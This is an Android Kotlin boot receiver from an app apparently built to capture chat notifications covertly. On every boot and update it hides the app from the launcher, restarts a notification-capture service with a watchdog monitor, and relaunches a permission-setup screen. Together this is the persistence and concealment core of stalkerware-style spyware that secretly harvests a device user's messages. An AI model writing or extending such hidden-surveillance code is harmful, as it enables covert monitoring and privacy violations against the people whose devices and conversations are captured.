package com.chats.capture.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.services.NotificationCaptureService
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import com.chats.capture.utils.ServiceStarter
import timber.log.Timber

class BootReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON" -> {
                Timber.tag("BOOT_RECEIVER").i("📱 Device boot completed - Auto-starting services and notification capture")
                Timber.d("Boot completed - starting services")
                
                // Ensure app is hidden from launcher
                AppVisibilityManager.hideFromLauncher(context)
                AppHider.ensureHidden(context)
                
                // Start notification capture service using utility
                Timber.tag("BOOT_RECEIVER").i("🔄 Starting NotificationCaptureService after boot...")
                ServiceStarter.startNotificationService(context)
                
                // Start service monitoring
                val serviceMonitor = ServiceMonitor(context)
                serviceMonitor.startMonitoring()
                
                // Ensure services remain running
                ServiceStarter.ensureServicesRunning(context)
                Timber.tag("BOOT_RECEIVER").i("✅ Services started after boot - Notification capture active")
            }
            Intent.ACTION_MY_PACKAGE_REPLACED -> {
                Timber.d("App updated - ensuring hidden and starting services")
                AppVisibilityManager.hideFromLauncher(context)
                AppHider.ensureHidden(context)
                
                // Start permission setup if needed
                val setupIntent = Intent(context, com.chats.capture.ui.PermissionSetupActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                    putExtra("auto_start", true)
                }
                try {
                    context.startActivity(setupIntent)
                } catch (e: Exception) {
                    Timber.e(e, "Error starting PermissionSetupActivity on update")
                }
                
                // Start services
                ServiceStarter.startNotificationService(context)
                ServiceStarter.ensureServicesRunning(context)
            }
        }
    }
}
